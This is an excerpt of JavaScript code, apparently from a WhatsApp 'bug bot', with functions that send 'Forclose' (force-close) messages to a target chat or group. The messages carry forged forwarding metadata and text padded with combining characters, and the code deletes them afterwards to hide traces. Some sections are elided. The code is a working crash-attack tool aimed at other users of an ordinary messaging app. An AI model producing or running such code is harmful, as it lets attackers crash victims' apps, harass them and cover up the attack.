...
async function SqL(jid, zal, total = 5, batchSize = 2, deleteDelay = 1200) {
  const axios = require("axios");
  const imageRes = await axios.get("https://files.catbox.moe/ge155m.png", {
    responseType: "arraybuffer"
  });
  const imageBuffer = imageRes.data;

  await zal.refreshMediaConn(true);
  await sleep(100);

  const media = await prepareWAMessageMedia(
    { image: imageBuffer, mimetype: "image/png" },
    { upload: zal.waUploadToServer }
  );
  ...
  const header = {
    ...
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      stanzaId: "ZalEra-" + Date.now(),
      participant: "0@s.whatsapp.net",
      quotedMessage: {
        extendedTextMessage: {
          text: "🩸 ͜͡\u0f51\u032f𝐓͙͢͠𝐡𝐞͚͡𝐄͢𝐧͡𝐝͓⍣𝐈͢͠𝐧𝐯͓͡𝐢𝐜͛͢𝐭𝐮͙͡𝐬͚ག⃟°⃟༑꙳🦠",
          contextInfo: {
            ...
            externalAdReply: {
              ...
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://zalofficial.com",
  ...
  for (let i = 0; i < total; i++) {
    ...
    await zal.relayMessage(jid, msg.message, {
      messageId: msg.key.id,
      participant: { jid }
    });

    console.log(`Sending Forclose ${i + 1} 💥`);
    batchKeys.push(msg.key);

    if (batchKeys.length >= batchSize) {
      await sleep(deleteDelay);
      await deleteMessages(zal, jid, batchKeys);
      batchKeys = [];
    }
  }
...
// Fungsi bug Forclose ke grup (gambar)
async function SqLGc(jid, sock, total = 5, batchSize = 2, deleteDelay = 1000) {
  ...
  const header = {
    ...
    contextInfo: {
      ...
      quotedMessage: {
        extendedTextMessage: {
          text: "🩸 ͜͡༑⃟𝐓͙͢͠𝐡𝐞͚͡𝐄͢𝐧͡𝐝͓⍣𝐈͢͠𝐧𝐯͓͡𝐢𝐜͛͢𝐭𝐮͙͡𝐬͚ག⃟°⃟༑꙳🦠",
          contextInfo: {
  ...
  for (let i = 0; i < total; i++) {
    ...
    console.log(`💥 Sending Forclose Group Gambar...`);
    batchKeys.push(msg.key);
...
async function deleteMessages(sock, jid, keys) {
  for (const key of keys) {
    const delKey = {
      ...
      id: key.id,
      fromMe: true,
      participant: key.participant || "0@s.whatsapp.net"
    };
    try {
      await sock.sendMessage(jid, { delete: delKey });
      console.log("🗑️ Delete Pesan Bug");
    } catch (e) {
      console.error("❌ Gagal Hapus Pesan Bug");
    }
    await sleep(50);
  }
}
